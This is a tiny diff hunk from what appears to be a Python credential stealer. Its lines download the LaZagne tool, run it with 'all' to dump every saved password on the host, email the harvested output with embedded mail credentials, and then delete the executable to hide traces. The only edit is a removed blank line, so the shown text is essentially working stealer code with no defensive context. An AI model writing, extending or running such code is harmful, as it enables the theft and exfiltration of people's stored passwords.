@@ -31,4 +31,3 @@ download(lazagne)
 result = subprocess.check_output("laZagne.exe all", shell=True)
 send_mail(email, password, result)
 os.remove("laZagne.exe")
- 
